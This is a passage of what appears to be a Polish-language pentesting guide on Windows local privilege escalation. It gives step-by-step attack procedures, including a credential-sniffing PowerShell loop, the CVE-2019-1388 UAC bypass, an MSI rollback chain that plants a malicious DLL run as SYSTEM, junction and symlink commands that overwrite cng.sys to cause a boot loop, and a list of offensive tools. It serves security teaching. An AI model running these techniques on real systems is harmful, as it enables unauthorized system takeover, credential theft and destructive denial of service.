Gdy uzyskasz shell jako użytkownik, mogą być wykonywane zaplanowane zadania lub inne procesy, które **przekazują dane uwierzytelniające w wierszu poleceń**. Poniższy skrypt przechwytuje wiersze poleceń procesów co dwie sekundy i porównuje bieżący stan z poprzednim, wyświetlając wszelkie różnice.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Wykradanie haseł z procesów

## Od użytkownika o niskich uprawnieniach do NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Jeśli masz dostęp do interfejsu graficznego (przez konsolę lub RDP), a UAC jest włączone, w niektórych wersjach systemu Microsoft Windows można uruchomić terminal lub dowolny inny proces jako „NT\AUTHORITY SYSTEM” z poziomu użytkownika bez uprawnień.

Dzięki tej samej podatności można jednocześnie eskalować uprawnienia i ominąć UAC. Ponadto nie trzeba niczego instalować, a plik binarny używany w tym procesie jest podpisany i wydany przez Microsoft.

Do niektórych podatnych systemów należą:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Aby wykorzystać tę podatność, należy wykonać następujące kroki:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Masz wszystkie niezbędne pliki i informacje w repozytorium GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Od poziomu integralności Administrator Medium do High / obejście UAC

Przeczytaj to, aby **dowiedzieć się o poziomach integralności**:


{{#ref}}
integrity-levels.md
{{#endref}}

Następnie **przeczytaj to, aby dowiedzieć się o UAC i jego obejściach:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junctions katalogu uploadu wskazujące na katalog obsługiwany przez serwer

Aplikacja może tworzyć przewidywalny podkatalog uploadu, zapisywać w nim plik o nazwie podanej przez użytkownika, a następnie przetwarzać ten plik. Jeśli użytkownik z niskimi uprawnieniami może usunąć ten podkatalog i zastąpić go junction NTFS przed zapisem po stronie serwera, zapis może trafić przez junction do katalogu obsługiwanego przez serwer WWW. Umieszczony tam skrypt może zostać uruchomiony z tożsamością usługi WWW, jeśli serwer wykonuje pliki tego typu. Jest to zależna od konkretnej aplikacji granica dowolnego zapisu — sam zapisywalny katalog uploadu lub istniejący junction nie stanowią dowodu.

Sprawdź dokładny sposób konstruowania ścieżki i moment zapisu w obsłudze uploadu, efektywne uprawnienia użytkownika do usuwania i tworzenia podkatalogu, efektywne ACL katalogu docelowego, to, czy proces zapisujący podąża za punktami ponownej analizy, oraz to, czy serwer WWW wykonuje pliki w tym katalogu. Osobno potwierdź tożsamość procesu zapisującego i serwera WWW. Pasywna inwentaryzacja może pokazać ACL katalogów i metadane punktów ponownej analizy, ale nie pozwala ustalić zachowania obsługi uploadu ani przyszłej podmiany junction. Jeśli wykonanie kodu odbywa się na koncie usługi, sprawdź **rzeczywisty token procesu**, zanim rozważysz osobną ścieżkę wykorzystującą uprawnienia tokenu.

## Od dowolnego usuwania/przenoszenia/zmiany nazwy folderu do SYSTEM EoP

Technika opisana [**w tym wpisie na blogu**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), wraz z kodem exploit [**dostępnym tutaj**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Atak polega zasadniczo na wykorzystaniu funkcji rollback Windows Installer do zastąpienia prawidłowych plików złośliwymi podczas procesu odinstalowywania. W tym celu atakujący musi utworzyć **złośliwy instalator MSI**, który posłuży do przejęcia folderu `C:\Config.Msi`. Windows Installer użyje go później do przechowywania plików rollback podczas odinstalowywania innych pakietów MSI; pliki rollback zostaną zmodyfikowane tak, aby zawierały złośliwy payload.

Podsumowanie techniki:

1. **Etap 1 – Przygotowanie do przejęcia (pozostawienie pustego `C:\Config.Msi`)**

- Krok 1: Zainstaluj MSI
    - Utwórz plik `.msi`, który instaluje nieszkodliwy plik (np. `dummy.txt`) w zapisywalnym folderze (`TARGETDIR`).
    - Oznacz instalator jako **„UAC Compliant”**, aby mógł go uruchomić **użytkownik niebędący administratorem**.
    - Po instalacji pozostaw otwarty uchwyt do pliku.

- Krok 2: Rozpocznij odinstalowywanie
    - Odinstaluj ten sam plik `.msi`.
    - Proces odinstalowywania zaczyna przenosić pliki do `C:\Config.Msi` i zmieniać ich nazwy na pliki `.rbf` (kopie zapasowe rollback).
    - **Monitoruj otwarty uchwyt do pliku** za pomocą `GetFinalPathNameByHandle`, aby wykryć, kiedy plik zmieni ścieżkę na `C:\Config.Msi\<random>.rbf`.

- Krok 3: Synchronizacja niestandardowa
    - Plik `.msi` zawiera **niestandardową akcję odinstalowywania (`SyncOnRbfWritten`)**, która:
        - Sygnalizuje zapisanie pliku `.rbf`.
        - Następnie **czeka** na inne zdarzenie przed kontynuowaniem odinstalowywania.

- Krok 4: Zablokuj usunięcie pliku `.rbf`
    - Po otrzymaniu sygnału **otwórz plik `.rbf`** bez `FILE_SHARE_DELETE` — **uniemożliwi to jego usunięcie**.
    - Następnie **odeślij sygnał**, aby odinstalowywanie mogło się zakończyć.
    - Windows Installer nie może usunąć pliku `.rbf`, a ponieważ nie może usunąć całej zawartości, **folder `C:\Config.Msi` nie zostaje usunięty**.

- Krok 5: Ręcznie usuń plik `.rbf`
    - Usuń ręcznie plik `.rbf`.
    - Teraz **folder `C:\Config.Msi` jest pusty** i gotowy do przejęcia.

> W tym momencie **wywołaj podatność umożliwiającą usuwanie dowolnego folderu na poziomie SYSTEM**, aby usunąć `C:\Config.Msi`.

2. **Etap 2 – Zastąpienie skryptów rollback złośliwymi**

- Krok 6: Odtwórz `C:\Config.Msi` ze słabymi ACL
    - Odtwórz samodzielnie folder `C:\Config.Msi`.
    - Ustaw **słabe DACL** (np. Everyone:F) i **pozostaw otwarty uchwyt** z uprawnieniem `WRITE_DAC`.

- Krok 7: Uruchom kolejną instalację
    - Ponownie zainstaluj plik `.msi`, podając:
        - `TARGETDIR`: zapisywalną lokalizację.
        - `ERROROUT`: zmienną, która wymusza błąd.
    - Ta instalacja posłuży do ponownego wywołania **rollback**, który odczytuje pliki `.rbs` i `.rbf`.

- Krok 8: Monitoruj plik `.rbs`
    - Użyj `ReadDirectoryChangesW`, aby monitorować `C:\Config.Msi` do momentu pojawienia się nowego pliku `.rbs`.
    - Zapisz jego nazwę.

- Krok 9: Synchronizacja przed rollback
    - Plik `.msi` zawiera **niestandardową akcję instalacji (`SyncBeforeRollback`)**, która:
        - Sygnalizuje zdarzenie po utworzeniu pliku `.rbs`.
        - Następnie **czeka** przed kontynuowaniem.

- Krok 10: Ponownie zastosuj słabe ACL
    - Po otrzymaniu zdarzenia `rbs created`:
        - Windows Installer **ponownie ustawia silne ACL** dla `C:\Config.Msi`.
        - Ponieważ nadal masz uchwyt z uprawnieniem `WRITE_DAC`, możesz **ponownie ustawić słabe ACL**.

> ACL są **sprawdzane tylko przy otwieraniu uchwytu**, więc nadal możesz zapisywać do folderu.

- Krok 11: Umieść fałszywe pliki `.rbs` i `.rbf`
    - Zastąp plik `.rbs` **fałszywym skryptem rollback**, który każe Windows:
        - Przywrócić plik `.rbf` (złośliwą bibliotekę DLL) w **uprzywilejowanej lokalizacji** (np. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Umieść fałszywy plik `.rbf` zawierający **złośliwy payload DLL działający na poziomie SYSTEM**.

- Krok 12: Wywołaj rollback
    - Zasygnalizuj zdarzenie synchronizacji, aby instalator wznowił działanie.
    - Skonfigurowano **niestandardową akcję typu 19 (`ErrorOut`)**, która **celowo powoduje niepowodzenie instalacji** w znanym momencie.
    - Powoduje to rozpoczęcie **rollback**.

- Krok 13: SYSTEM instaluje Twoją bibliotekę DLL
    - Windows Installer:
        - Odczytuje złośliwy plik `.rbs`.
        - Kopiuje bibliotekę DLL z pliku `.rbf` do lokalizacji docelowej.
    - Złośliwa biblioteka DLL znajduje się teraz w **ścieżce ładowanej przez SYSTEM**.

- Ostatni krok: Uruchom kod jako SYSTEM
    - Uruchom zaufany **automatycznie podwyższający uprawnienia plik binarny** (np. `osk.exe`), który ładuje przejętą bibliotekę DLL.
    - **Gotowe**: Twój kod zostanie wykonany **jako SYSTEM**.


### Od dowolnego usuwania/przenoszenia/zmiany nazwy pliku do SYSTEM EoP

Główna technika MSI rollback (opisana wyżej) zakłada, że możesz usunąć **cały folder** (np. `C:\Config.Msi`). Ale co, jeśli podatność pozwala tylko na **dowolne usuwanie plików**?

Możesz wykorzystać **wewnętrzne mechanizmy NTFS**: każdy folder ma ukryty alternatywny strumień danych o nazwie:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Ten strumień przechowuje **metadane indeksu** folderu.

Jeśli więc **usuniesz strumień `::$INDEX_ALLOCATION`** folderu, NTFS **usunie cały folder** z systemu plików.

Możesz to zrobić za pomocą standardowych interfejsów API do usuwania plików, takich jak:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Mimo że wywołujesz API usuwania *pliku*, **usuwa ono sam folder**.

### Od usuwania zawartości folderu do EoP do SYSTEM
Co jeśli Twoja primitive nie pozwala usuwać dowolnych plików/folderów, ale **pozwala usuwać *zawartość* folderu kontrolowanego przez atakującego**?

1. Krok 1: Przygotuj folder-przynętę i plik
- Utwórz: `C:\temp\folder1`
- Wewnątrz utwórz: `C:\temp\folder1\file1.txt`

2. Krok 2: Ustaw **oplock** na `file1.txt`
- Oplock **wstrzymuje wykonanie**, gdy uprzywilejowany proces próbuje usunąć `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Krok 3: Uruchom proces SYSTEM (np. `SilentCleanup`)
- Proces ten skanuje foldery (np. `%TEMP%`) i próbuje usuwać ich zawartość.
- Gdy dotrze do `file1.txt`, **oplock zostaje wyzwolony** i przekazuje kontrolę do Twojego callbacka.

4. Krok 4: W callbacku oplocka — przekieruj usuwanie

- Opcja A: Przenieś `file1.txt` w inne miejsce
    - Spowoduje to opróżnienie `folder1` bez przerwania oplocka.
    - Nie usuwaj bezpośrednio `file1.txt` — spowodowałoby to przedwczesne zwolnienie oplocka.

- Opcja B: Zmień `folder1` w **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Opcja C: Utwórz **symlink** w `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> To kieruje działanie na wewnętrzny strumień NTFS, który przechowuje metadane folderu — usunięcie go usuwa folder.

5. Step 5: Zwolnienie oplocka
- Proces SYSTEM działa dalej i próbuje usunąć `file1.txt`.
- Jednak teraz, z powodu junction + symlink, w rzeczywistości usuwa:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Wynik**: `C:\Config.Msi` jest usuwany przez SYSTEM.

### Od utworzenia dowolnego folderu do trwałego DoS

Wykorzystaj prymityw umożliwiający **utworzenie dowolnego folderu jako SYSTEM/admin** — nawet jeśli **nie możesz zapisywać plików** ani **ustawiać słabych uprawnień**.

Utwórz **folder** (nie plik) o nazwie **krytycznego sterownika Windows**, np.:
```
C:\Windows\System32\cng.sys
```

- Ta ścieżka zwykle odpowiada sterownikowi trybu jądra `cng.sys`.
- Jeśli **utworzysz ją wcześniej jako folder**, system Windows nie załaduje właściwego sterownika podczas rozruchu.
- Następnie system Windows próbuje załadować `cng.sys` podczas rozruchu.
- Wykrywa folder, **nie może odnaleźć właściwego sterownika** i **ulega awarii lub zatrzymuje rozruch**.
- **Nie ma mechanizmu awaryjnego ani możliwości odzyskania systemu** bez zewnętrznej interwencji (np. naprawy rozruchu lub dostępu do dysku).

### Od uprzywilejowanych ścieżek logów/kopii zapasowych i symlinków OM do nadpisania dowolnego pliku / DoS rozruchu

Gdy **uprzywilejowana usługa** zapisuje logi/eksporty w ścieżce odczytanej z **zapisywalnej konfiguracji**, przekieruj tę ścieżkę za pomocą **symlinków Object Manager + punktów montowania NTFS**, aby zamienić uprzywilejowany zapis w nadpisanie dowolnego pliku (nawet **bez SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Wymagania**
- Plik konfiguracyjny przechowujący ścieżkę docelową jest zapisywalny przez atakującego (np. `%ProgramData%\...\.ini`).
- Możliwość utworzenia punktu montowania do `\RPC Control` i symlinku pliku OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Uprzywilejowana operacja zapisująca w tej ścieżce (log, eksport, raport).

**Przykładowy łańcuch**
1. Odczytaj konfigurację, aby ustalić docelową ścieżkę uprzywilejowanego logu, np. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` w `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Przekieruj ścieżkę bez uprawnień administratora:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Poczekaj, aż uprzywilejowany komponent zapisze log (np. administrator wybierze opcję „wyślij testowy SMS”). Zapis trafi teraz do `C:\Windows\System32\cng.sys`.
4. Sprawdź nadpisany plik docelowy (parser hex/PE), aby potwierdzić jego uszkodzenie; ponowne uruchomienie wymusza załadowanie przez Windows zmodyfikowanej ścieżki sterownika → **DoS w postaci pętli rozruchowej**. To samo dotyczy każdego chronionego pliku, który uprzywilejowana usługa otworzy do zapisu.

> `cng.sys` jest zwykle ładowany z `C:\Windows\System32\drivers\cng.sys`, ale jeśli jego kopia znajduje się w `C:\Windows\System32\cng.sys`, może zostać użyta jako pierwsza, co czyni ją niezawodnym celem DoS dla uszkodzonych danych.



## **Od High Integrity do SYSTEM**

### **Nowa usługa**

Jeśli działasz już w procesie o High Integrity, **ścieżka do SYSTEM** może być prosta — wystarczy **utworzyć i uruchomić nową usługę**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Podczas tworzenia pliku binarnego usługi upewnij się, że jest on prawidłową usługą lub że wykonuje niezbędne działania szybko, ponieważ zostanie zakończony po 20 s, jeśli nie jest prawidłową usługą.

### AlwaysInstallElevated

Z procesu o wysokim poziomie integralności możesz spróbować **włączyć wpisy rejestru AlwaysInstallElevated** i **zainstalować** reverse shell za pomocą wrappera _**.msi**_.\
[Więcej informacji o użytych kluczach rejestru i instalowaniu pakietu _.msi_ znajdziesz tutaj.](#alwaysinstallelevated)

### Wysoki poziom integralności + uprawnienie SeImpersonate do System

**Możesz** [**znaleźć kod tutaj**](seimpersonate-from-high-to-system.md)**.**

### Od SeDebug + SeImpersonate do pełnych uprawnień tokenu

Jeśli masz te uprawnienia tokenu (prawdopodobnie znajdziesz je w procesie o wysokim poziomie integralności), będziesz w stanie **otworzyć niemal dowolny proces** (z wyjątkiem procesów chronionych) z uprawnieniem SeDebug, **skopiować token** procesu i utworzyć **dowolny proces z tym tokenem**.\
Ta technika zwykle polega na **wybraniu dowolnego procesu działającego jako SYSTEM ze wszystkimi uprawnieniami tokenu** (_tak, możesz znaleźć procesy SYSTEM bez wszystkich uprawnień tokenu_).\
**Przykład kodu wykonującego opisaną technikę znajdziesz** [**tutaj**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Ta technika jest używana przez meterpreter do eskalacji uprawnień w `getsystem`. Polega na **utworzeniu pipe, a następnie utworzeniu lub nadużyciu usługi, aby zapisywała do tego pipe**. Następnie **serwer**, który utworzył pipe przy użyciu uprawnienia **`SeImpersonate`**, będzie mógł **podszyć się pod token** klienta pipe (usługi), uzyskując uprawnienia SYSTEM.\
Jeśli chcesz [**dowiedzieć się więcej o name pipes, przeczytaj ten materiał**](#named-pipe-client-impersonation).\
Jeśli chcesz przeczytać przykład [**przejścia z wysokiego poziomu integralności do System przy użyciu name pipes, przeczytaj ten materiał**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Jeśli uda ci się **przejąć dll** **ładowany** przez **proces** działający jako **SYSTEM**, będziesz w stanie wykonać dowolny kod z jego uprawnieniami. Dlatego Dll Hijacking jest również przydatny w tego rodzaju eskalacji uprawnień. Co więcej, **znacznie łatwiej przeprowadzić go z procesu o wysokim poziomie integralności**, ponieważ będzie miał **uprawnienia do zapisu** w folderach używanych do ładowania dll.\
**Możesz** [**dowiedzieć się więcej o Dll hijacking tutaj**](dll-hijacking/index.html)**.**

### **Od Administrator lub Network Service do System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Od LOCAL SERVICE lub NETWORK SERVICE do pełnych uprawnień

**Przeczytaj:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Więcej pomocy

[Statyczne pliki binarne impacket](https://github.com/ropnop/impacket_static_binaries)

## Przydatne narzędzia

**Najlepsze narzędzie do wyszukiwania lokalnych wektorów eskalacji uprawnień w Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Wyszukuje błędne konfiguracje i poufne pliki (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Wykrywa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Wyszukuje możliwe błędne konfiguracje i zbiera informacje (**[**sprawdź tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Wyszukuje błędne konfiguracje**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Wyodrębnia zapisane informacje o sesjach PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Użyj lokalnie opcji -Thorough.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Wyodrębnia dane uwierzytelniające z Credential Manager. Wykrywany.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Rozprowadza zebrane hasła w domenie**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh to narzędzie PowerShell do spoofingu ADIDNS/LLMNR/mDNS oraz ataków man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Podstawowa enumeracja Windows pod kątem privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Wyszukuje znane luki privesc (PRZESTARZAŁE, zastąpione przez Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne kontrole **(wymagane uprawnienia administratora)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Wyszukuje znane luki privesc (wymaga kompilacji przy użyciu VisualStudio) ([**skompilowana wersja**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Skanuje hosta w poszukiwaniu błędnych konfiguracji (służy bardziej do zbierania informacji niż do privesc) (wymaga kompilacji) **(**[**skompilowana wersja**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Wyodrębnia dane uwierzytelniające z wielu programów (skompilowany plik exe jest dostępny w github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp do C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Wyszukuje błędne konfiguracje (skompilowany plik wykonywalny jest dostępny w github). Niezalecane. Nie działa dobrze w Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Wyszukuje możliwe błędne konfiguracje (exe z Pythona). Niezalecane. Nie działa dobrze w Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Narzędzie utworzone na podstawie tego wpisu (do poprawnego działania nie wymaga accesschk, ale może go używać).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Odczytuje wynik **systeminfo** i sugeruje działające exploity (lokalny Python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Odczytuje wynik **systeminfo** i sugeruje działające exploity (lokalny Python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Musisz skompilować projekt przy użyciu odpowiedniej wersji .NET ([zobacz tutaj](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Aby sprawdzić wersję .NET zainstalowaną na hoście ofiary, możesz wykonać:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Podstawy eskalacji uprawnień w Windows](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Eskalacja uprawnień przez wykorzystanie słabych uprawnień do folderów](http://www.greyhathacker.net/?p=738)
- [3] [Eskalacja uprawnień w Windows — ściągawka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop — warsztaty lokalnej eskalacji uprawnień w Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 — Ataki na Windows: AT to nowa czerń (Rob Fuller i Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Eskalacja uprawnień — Windows — kompletny przewodnik OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows — eskalacja uprawnień — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Przewodnik po eskalacji uprawnień w Windows](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Lista kontrolna eskalacji uprawnień w Windows](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Eskalacja uprawnień w Windows](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Metody eskalacji uprawnień w Windows dla pentesterów](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf — HTB/VulnLab JobTwo: phishing z makrem VBA w Wordzie przez SMTP → odszyfrowanie poświadczeń hMailServer → wykorzystanie CVE-2023-27532 w Veeam do uzyskania SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: leak w formacie ciągu znaków + stack BOF → ROP z VirtualAlloc (RCE) i kradzież tokenu jądra](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research — Polowanie na Silver Fox: kot i mysz w cieniu jądra](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 — Luka w systemie plików z podwyższonymi uprawnieniami w systemie SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Narzędzia do testowania dowiązań symbolicznych — użycie CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Powrót do przeszłości. Nadużywanie dowiązań symbolicznych w Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [Koniec RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js Trust Falls: niebezpieczne rozwiązywanie modułów w Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduły Node.js: ładowanie z folderów `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — rozwiązane zadania z listy kontrolnej C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — funkcja RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — przejęcie binariów usług](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own z Microslop: łączenie CLDFLT i wyścigów w jądrze DirectX w celu lokalnej eskalacji uprawnień w Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jeden I/O Ring, by wszystkimi rządzić: pełna możliwość odczytu/zapisu w Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Nadużywanie dowolnego usuwania plików w celu eskalacji uprawnień i inne przydatne sztuczki](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — kod exploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — ataki na WSUS, część 2: CVE-2020-1013, jednodniowa lokalna eskalacja uprawnień w Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: poznajemy Credential Manager i Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — ograniczona delegacja Kerberos oparta na zasobach: gdy zmiana obrazu prowadzi do eskalacji uprawnień](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — wyodrębnianie prywatnych kluczy SSH z agenta SSH w Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — zamienianie korporacyjnych serwerów aktualizacji w fabryki backdoorów (0_o) — część 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — zamienianie korporacyjnych serwerów aktualizacji w fabryki backdoorów (0_o) — część 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
